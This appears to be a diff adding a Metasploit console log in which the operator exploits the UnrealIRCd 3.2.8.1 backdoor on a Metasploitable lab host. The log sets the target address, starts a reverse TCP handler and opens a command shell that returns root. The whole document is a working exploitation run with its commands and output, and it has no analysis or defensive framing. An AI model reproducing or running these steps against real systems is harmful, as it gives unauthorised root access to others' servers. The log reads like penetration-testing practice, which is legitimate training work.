@@ -1,0 +1,35 @@
+msf exploit(vsftpd_234_backdoor) > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf exploit(unreal_ircd_3281_backdoor) > show options
+
+Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  6667             yes       The target port
+
+msf exploit(unreal_ircd_3281_backdoor) > set RHOST 10.0.0.100
+RHOST => 10.0.0.100
+msf exploit(unreal_ircd_3281_backdoor) > exploit
+
+[*] Started reverse TCP double handler on 10.0.0.101:4444 
+[*] Connected to 10.0.0.100:6667...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname;
+[*] Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo czuWPQybMd0rmtY1;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "czuWPQybMd0rmtY1\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 2 opened (10.0.0.101:4444 -> 10.0.0.100:48501)
+
+whoami
+root
+who
+msfadmin tty1         Apr 23 09:02
+root     pts/0        Apr 23 08:57 (:0.0)
